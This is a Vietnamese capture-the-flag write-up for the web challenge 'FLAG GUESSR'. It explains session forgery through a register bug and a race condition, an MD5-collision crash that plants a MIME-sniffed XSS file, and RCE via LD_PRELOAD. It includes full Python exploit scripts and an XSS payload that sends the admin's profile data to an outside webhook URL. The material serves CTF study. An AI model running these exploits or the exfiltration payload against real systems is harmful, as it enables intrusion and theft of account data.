+++
title = 'FLAG GUESSR'
tags = [
  "web",
  "499 points",
  "6 solves",
  "downgrade"
]
draft = true
+++


# L3AK CTF 
**Write up cho bài mình không solve ra trong giải**

**Knowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision**

Bài này có 2 cách :  Unintended và intended nhưng mình sẽ nói sơ qua về walkthrough trước nhé 

## Walthrough : 
Mục tiêu của bài này là lấy được RCE thông qua một đống chain...

Trong giải thì bài này mình bị kẹt vì mắc một cái bẫy CSRF khá đần . 
Mình thấy bug csrf ròi tìm cách làm đủ thứ nhưng hầu như chả có tác dụng gì và mình biết thấy mọi attack vector muốn hoạt động được thì đều cần forge được session nhưng vì để forge được quá khó nên hầu như mình bí ngậm ngùi...


# Đọc write up 
Cách unintended có vẻ dễ hiểu hơn nên ta sẽ bắt đầu  với nó .
Idea chính để lên được RCE là set được biến môi trường  : 

```sh
     LD_PRELOAD =./route/to/my/flag.txt
```
Đây là cách duy nhất để ta có thể lấy RCE nhưng mình không biết cái này nên cũng bí từ đầu ròi ...
Ok vậy làm sao để attack được vào biến môi trường thì trong source chỉ có một đoạn ảnh hưởng đến ENV thoi

```go
	cmd.Env = append(os.Environ(), fmt.Sprintf("correct_guesses=%d", u.FlagsFound))
	cmd.Env = append(cmd.Env, fmt.Sprintf("total_attempts=%d", u.FlagsChecked))
	// cai nay weird vc dang le ra phai thay chu ta : )
	for k, v := range session.Properties {
		cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", k, v))
	}
```

Ở đây ta thấy biến ENV sẽ được set theo Properties của session bằng vòng for loop .. 
Đáng lẽ ở đây mình nên nhận ra điều này sớm hơn vì khi ta tạo một user bình thường thì **properties** chỉ chứa đúng duy nhất một key thì tạo vòng for loop để làm chi :0 . Điều này dẫn đến việc ta cần phải tìm cách để forge được một jwt bất kì .

### Forge JWT KEY 
Trong giải thì mình nghĩ đến cách sẽ leak JWT KEY bằng cách nào đó nhưng hầu như không có cách nào cả và mình bí típ : ) 

Thì cách unintended sẽ lợi dụng một cái bug ở register như sau  : 

```go

func Register(w http.ResponseWriter, r *http.Request) {
	session, valid, resp, err := RequestMiddleware(w, r)
	resp.Body = "/register"
	// BUG NOT CHECK VALID ?
	defer resp.respondRedirect()
	if err != nil {
		resp.Body = "/register?e=bad request"
		return
	}
	if valid && session.LoggedIn {
		resp.Body = "/home"
		return
	}
	// Sign everything we want
	// Defer call when packnick and all trime
	defer session.UpdateSession(w)

	flagFile, _, err := r.FormFile("flag")
	if err != nil {
		session.ClearSession()
		resp.Body = "/register?e=bad request"
		return
	}
	username := r.FormValue("username")
	password := r.FormValue("password")
	displayName := r.FormValue("display_name")
	if len(username) == 0 {
		session.ClearSession()
		resp.Body = "/register?e=missing username"
		return
	} else if len(password) == 0 {
		session.ClearSession()
		resp.Body = "/register?e=missing password"
		return
	} else if len(displayName) == 0 {
		session.ClearSession()
		resp.Body = "/register?e=missing display name"
		return
	}
	newUser := &User{
		Username:    strings.ToLower(username),
		DisplayName: displayName,
		Password:    password,
		UserType:    UserKindStandard,
		UserID:      uuid.NewString(),
	}
	// doan nay bi race condition
	available, err := newUser.CheckUsernameAvailable()
	if err != nil {
		session.ClearSession()
		resp.Body = "/register?e=bad request"
		return
	}
	if !available {
		session.ClearSession()
		resp.Body = "/register?e=username taken"
		return
	}
	err = os.MkdirAll(fmt.Sprintf("./userdata/%s/uploads", newUser.UserID), 0644)
	if err != nil {
		session.ClearSession()
		resp.Body = "/register?e=internal server error"
		return
	}
	f, err := os.OpenFile(fmt.Sprintf("./userdata/%s/flag.txt", newUser.UserID), os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		session.ClearSession()
		resp.Body = "/register?e=internal server error"
		return
	}
	defer f.Close()
	_, err = io.Copy(f, flagFile)
	if err != nil {
		session.ClearSession()
		resp.Body = "/register?e=internal server error"
		return
	}
	// Chi co o day la khong clear session =))
	err = newUser.InsertUser()
	if err != nil {
		resp.Body = "/register?e=bad request"
		return
	}
	session.InitSession(newUser)
	resp.Body = "/home"
}
```

- Ở đây ta thấy sau khi check session invalid thì đáng lẽ phải return khỏi hàm luôn nhưng ở đây thì check thiếu cái đấy. Dẫn đến việc hàm defer UpdateSession sẽ được gọi và **sign** luôn cái session cookie của mình và đến đoạn này đáng lẽ ta sẽ có được cookie đã được sign nhưng sẽ bị clear nếu như **session.ClearSession** được gọi.
- Đọc tiếp ta sẽ thấy chỉ duy nhất một case Session không bị clear là đoạn newUser.InsertUser() . Để hàm này bị error thì ta chỉ cần tạo 2 user giống username và display_name là được vì trong config của db :  
```go
`CREATE TABLE users (user_id text UNIQUE, username text COLLATE NOCASE, password text, display_name text, description text NULL, user_type integer, cheater integer, PRIMARY KEY (username, display_name));`
```
- Ta thấy PRIMARY KEY ở đây gồm cả (username,display_name) tức là một cặp này phải là unique.
- Vậy đến đây ta chỉ cần tạo 2 user giống nhau ? Không , ở trên có một đoạn checkUsernameAvaiable nữa. 

## Bypass checkUsername
- Để qua được hàm này thì ta có thể để ý đến cái case được chỉ định cho username trong config là **COLLATE NOCASE** và nghĩ đến việc tryền 2 username khác case nhau nhưng đã bị block bởi toLowerCase() .
- Để bypass đoạn này thì ta có 2 cách dẫn đến 2 solution khác nhau : 
1. Race condition
2. Leak display_name 

Mình sẽ giải thích cách 2 sau. Cách 1 thì race condition thì đấy , race thôi....

Script của mình như sau  :  

```python 
import requests
import threading

import jwt


JWT_KEY ="FUCK"
FLAG_SO_ID  = ""
MALICOUS_SESSION  =""


url =  "http://localhost:5555"

url = "http://34.59.119.124:17005"
def register(username, password):   
    s=  requests.Session()
    data = {
        "username": username,
        "password": password,
        "display_name": "1337",
    }
    payload = {"username":"sa","user_id":FLAG_SO_ID,"display_name":"1337","user_kind":0,"flags_checked":0,"flags_found":0,
            "properties" : {
            "description" : "FUCk" ,
            "LD_PRELOAD" :  f"/app/userdata/{FLAG_SO_ID}/flag.txt",
    },"logged_in" :True}

    token = jwt.encode(payload, JWT_KEY, algorithm="HS256")
    with open("flag.so", "rb") as flag_file:
        files = {"flag": flag_file}
        cookies = {"session": token}
        response = requests.post(f"{url}/register",data=data, files=files, cookies=cookies, allow_redirects=False)
        print(response.cookies)
        return response

def login(username, password):
    s = requests.Session()
    data = {
        "username": username,
        "password": password,
    }
    response = s.post(f"{url}/login", data=data,allow_redirects=False)
    print(response.cookies)
    return s



def getProfile(session):
    res = session.get(url+'/api/profile',allow_redirects=False)
    print(res.text)
    return res.json()['user_id']


username = "sa"
password =  "s"
register(username,password)
s=  login(username,password)
FLAG_SO_ID = getProfile(s)
print(f"FLAG_SO_ID: {FLAG_SO_ID}")

## Start RACE CONDITION TO BYPASS CHECKUSERNAME AND REACH THE INSERT  ###J
username="aaaa"
password ="s"

t1 = threading.Thread(target=register, args=(username, password))
t2 = threading.Thread(target=register, args=(username, password))

t1.start()
t2.start()
t1.join()
t2.join()

```

**Flow :**
1. Upload So File
2. Forge session with race conditon
3. Make ceritficate with forged session


## Intend 
Leak display_name .
Bởi vì username admin luôn được tạo với Admin-* nên case của ta sẽ không bao giờ bị catch :> . Vậy vấn đề để trigger bug thì phải insert đúng chính xác display_name .
Đến đây thì mình có nghĩ đến cách CSRF vì có bug CSRF :) nma ko có effect vì có cors :( :sadge
- Vậy thứ ta cần ở đây là XSS. Chỗ nào có xss nhỉ ? Check trên các page html thì ta không hề thấy sự xuất hiện của innerHTML nên ta có thể loại bỏ trường hợp này.

- Nhưng server có thể trả về response theo 2 cách , 1 trong 2 cách đó là trả về **RAW RESPONSE**
```go

func (r *Response) respondRaw() error {
	if r.Responded {
		return nil
	}
	if r.RespCode == 0 {
		r.RespCode = http.StatusOK
	}
	r.Writer.WriteHeader(r.RespCode)
	respBytes, ok := r.Body.([]byte)
	if !ok {
		return fmt.Errorf("invalid body")
	}
	_, err := r.Writer.Write(respBytes)
	r.Responded = true
	return err
}
```
Bug này khá giống với MIME SNIFFER của chromium khi sẽ auto detect content type dựa trên các 512 bytes đầu tiên có khá nhiều cách : https://chromium.googlesource.com/chromium/src/net/+/master/base/mime_sniffer.cc
Đơn giản là chèn <!DOCTYPE> prefix vào phía trước thôi. 
- Vậy hàm này được sử dụng ở đâu ?  
```go
func GetGuess(w http.ResponseWriter, r *http.Request) {
	session, valid, resp, err := RequestMiddleware(w, r)
	defer resp.respond()
	if err != nil {
		return
	}
	if !valid || !session.LoggedIn {
		session.ClearSession()
		session.UpdateSession(w)
		resp.setError(fmt.Errorf("not logged in"), http.StatusUnauthorized)
		return
	}
	defer session.UpdateSession(w)

	guesserID := r.PathValue("guesser_id")
	guessID := r.PathValue("guess_id")
	guesser, err := FindUser(guesserID)
	if err != nil {
		resp.setError(fmt.Errorf("user not found"), http.StatusBadRequest)
		return
	}
	guess, err := guesser.FindGuess(guessID)
	if err != nil {
		resp.setError(fmt.Errorf("guess not found"), http.StatusBadRequest)
		return
	}
	if session.UserKind != UserKindAdmin && guess.GuesserID != session.UserID {
		resp.setError(fmt.Errorf("only admins can see other users' guesses"), http.StatusBadRequest)
		return
	}
	guessPath := guess.GetFilePath()
	guessBytes, err := os.ReadFile(guessPath)
	if err != nil {
		resp.setError(fmt.Errorf("incorrect guesses not saved"), http.StatusBadRequest)
		return
	}
	resp.Body = guessBytes
	resp.respondRaw()
}
```
Xài duy nhất ở hàm này. Hàm này sẽ đọc từ file đã guess của user và trả về response nên ta cần handle được nội dung trong file đấy. Phần khó chính là hàm checkFlag khá khó chịu  : 

```go 
func CheckFlag(w http.ResponseWriter, r *http.Request) {
	session, valid, resp, err := RequestMiddleware(w, r)
	defer resp.respond()
	if err != nil {
		return
	}
	if !valid || !session.LoggedIn {
		session.ClearSession()
		session.UpdateSession(w)
		resp.setError(fmt.Errorf("not logged in"), http.StatusUnauthorized)
		return
	}
	defer session.UpdateSession(w)

	if r.ContentLength == 0 {
		resp.setError(fmt.Errorf("missing body"), http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	flagGuess := r.FormValue("flag")
	flagHolderID := r.PathValue("id")

	u, err := FindUser(flagHolderID)
	if err != nil {
		resp.setError(fmt.Errorf("user not found"), http.StatusBadRequest)
		return
	}
	if u.UserID == session.UserID {
		resp.setError(fmt.Errorf("you can't guess your own flag"), http.StatusBadRequest)
		return
	}

	guess := Guess{
		GuessID:      uuid.NewString(),
		GuesserID:    session.UserID,
		FlagHolderID: u.UserID,
		Correct:      false,
	}
	alreadyFound, err := guess.CheckFound()
	if err != nil {
		resp.setError(err, http.StatusBadRequest)
		return
	}
	if alreadyFound {
		resp.setError(fmt.Errorf("you already found that flag"), http.StatusBadRequest)
		return
	}
	err = guess.InsertGuess()
	if err != nil {
		resp.setError(err, http.StatusBadRequest)
		return
	}

	guessPath := guess.GetFilePath()
	err = os.WriteFile(guessPath, []byte(flagGuess), 0644)
	if err != nil {
		resp.setError(err, http.StatusBadRequest)
		return
	}
	correct, md5, sha := guess.CheckGuess()
	if correct {
		guess.MarkCorrect()
	}
	if !correct {
		os.Remove(guessPath)
	} else {
		os.WriteFile(guessPath, []byte(fmt.Sprintf("MD5: %s\nSHA256: %s", md5, sha)), 0644)
	}
	resp.Body = FlagCheckResponse{Correct: correct}
}

```

Hàm này sẽ kiểm tra md5sum của 2 file có bằng nhau không và sha256 của 2 file có bằng nhau không , nếu không bằng nó sẽ xóa file còn nếu bằng thì nó sẽ viết giá trị của MD5 và SHA256 vào file ?  
- Cả 2 điều kiện trên mình đều thật sư không cần ... 
- Vậy phải làm sao để ghi file của mình vào ? Đọc vào hàm CheckGuess ta có thể thấy một trigger sau khá dị 
```go
func (g *Guess) CheckGuess() (bool, string, string) {
    ...
	if md5Equal != shaEqual {
		g.MarkCheater()
	}
    ...
```
Nếu như md5 bằng nhưng sha không bằng thì sẽ gọi MarkCheater ? 
Và trolling ở đây là hàm MarkCheater này sẽ gây crash program do thiếu dấu "?"  holy fack
```go 
	MARK_CHEATER         = `UPDATE users SET cheater = 1 WHERE user_id = ;`
```
MÌnh đã không nghĩ tới trường hợp này trong lúc giải và cũng đã không test thử function này đó là lý do mình ko tìm được bug . Vì serverr hỗ trợ autorestart nên lúc này hàm crash và file của mình sẽ không bị xóa .
Nhưng còn một điều nữa là mình cần phải có md5 EQUAL thì cái nì khá đơn giản vì có lỗi md5 collision khá nổi tiếng và có tool hỗ trợ là fastcoll . 

- Khi có được xss thì ta chỉ cần redirect bot tới : 
/api/users/{guesser_id}/guesses/guess_id
- Stole được display_name và register với username admin và display_name cùng với session cần được signed và phần còn lại như trên
 
Script của mình  : 

```py
import requests
import threading

import jwt

admin_username = "admin-71aaf14e-55d3-4a88-8c31-e9db2f265c3e"
admin_displayName = "eccdce48-7f26-421b-9d75-65f7002453d5"

JWT_KEY ="FUCK"
FLAG_SO_ID  = ""
MALICOUS_SESSION  =""

url =  "http://localhost:5555"
url = "http://34.59.119.124:17005"
XSS_PATH = ""


def register(username, password,display_name="1337",payload=None):   
    s=  requests.Session()
    data = {
        "username": username,
        "password": password,
        "display_name": display_name,
    }
    

    token = ""
    if payload : 
        token = jwt.encode(payload, JWT_KEY, algorithm="HS256")
    with open("flag.so", "rb") as flag_file:
        files = {"flag": flag_file}
        cookies = {"session": token}
        response = requests.post(f"{url}/register",data=data, files=files, cookies=cookies, allow_redirects=False)
        print(response.cookies)
        return response

def login(username, password):
    s = requests.Session()
    data = {
        "username": username,
        "password": password,
    }
    response = s.post(f"{url}/login", data=data,allow_redirects=False)
    print(response.cookies)
    return s



def getProfile(session):
    res = session.get(url+'/api/profile',allow_redirects=False)
    print(res.text)
    return res.json()

def bot(session) :  
    global XSS_PATH
    payload = "fetch('/api/profile').then(res=>res.json()).then(text=>fetch('https://webhook.site/49982724-4ed4-4980-bdbc-f7efed1b6335?q='+text.display_name+'&u='+text.username))"
    data = {
        "url"  : XSS_PATH + "#" +payload
    }
    res = session.post(url+'/api/report',json=data)
    print(res.text)

def createMsg1(username,password):
    s=  requests.Session()
    data = {
        "username":username,
        "password": password,
        "display_name": "1337",
    }
    with open("msg1.bin", "rb") as flag_file:
        files = {"flag": flag_file}
        response = requests.post(f"{url}/register",data=data, files=files, allow_redirects=False)
        print(response.cookies)
        return response

def checkFlag(session,checked_id,checker_id) :  
    global XSS_PATH
    with open("msg2.bin", "rb") as f: 
        data = {
            "flag": f.read()
        }
        try :
            response = session.post(f"{url}/api/users/{checked_id}/checkflag",data=data,allow_redirects=False)
            print("FAIL")
        except :
            print("SUCCESSFULLLY")
            res  = session.get(f"{url}/api/users/{checker_id}/guesses",allow_redirects=False)
            guess_id = res.json()['guesses'][-1]['guess_id']
            XSS_PATH += f"/api/users/{checker_id}/guesses/{guess_id}"
            print("XSS_URL: ", XSS_PATH)
##Create HasH

if admin_displayName =="" : 
    username= "fucaka"
    password=  "fuckaa"
    createMsg1(username,password)
    s = login(username,password)
    msg1Id = getProfile(s)
    print(f"MSG1 ID = {msg1Id}\n")


    ## Createt guesser
    username = "guessers"
    password = "guessers"
    register(username,password)
    s = login(username,password)
    guesserId = getProfile(s)
    print(f"GUESSER ID  = {guesserId}")
    checkFlag(s,msg1Id,guesserId)
    bot (s)
    exit(0)

## Now we have the display name ##
## TIME TO EXPLOIT ## 

register("SOaaa","SOaaa")
s = login("SOaaa","SOaaa")


FLAG_SO = getProfile(s)
print(f"FLAG_SO_ID: {FLAG_SO['user_id']}")
props =  {
            "description" : "FUCk" ,
            "LD_PRELOAD" :  f"/app/userdata/{FLAG_SO['user_id']}/flag.txt",
    }
FLAG_SO["logged_in"] = True
FLAG_SO['properties'] = props
register (admin_username,"?",admin_displayName,FLAG_SO) 
```

## New knowledge 
- Rce gadget through ENV $LD_PRELOAD (mình khong biết điều này nên đã khá vướng bận khi tìm gadget rce)
- md5 collision
- Forgery session with race condition ( đôi khi không cần leak jwt key để có một signed session)

## Rút kinh nghiệm :  
1. Đọc kĩ hơn :) 
2. Test mọi case đề chặn 
3. Trình